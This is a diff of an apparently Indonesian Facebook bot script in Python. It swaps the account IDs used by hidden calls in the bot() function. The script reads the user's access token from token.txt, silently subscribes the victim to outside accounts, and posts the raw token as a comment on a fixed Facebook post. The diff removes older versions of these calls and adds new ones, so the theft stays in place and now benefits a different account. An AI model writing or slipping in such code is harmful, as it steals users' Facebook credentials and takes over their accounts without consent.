@@ -50,12 +50,8 @@ def bot():
 		token = open('token.txt', 'r').read()
 	except (KeyError, IOError):
 		exit(" %s[!] token kadaluwarsa!"%(M))
-	requests.post('https://graph.facebook.com/100023812724814/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100026441864942/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100013775598620/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100004601539472/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100006033517423/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + token)
+	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+token+'&access_token=' + token)
 
 # MENU
 
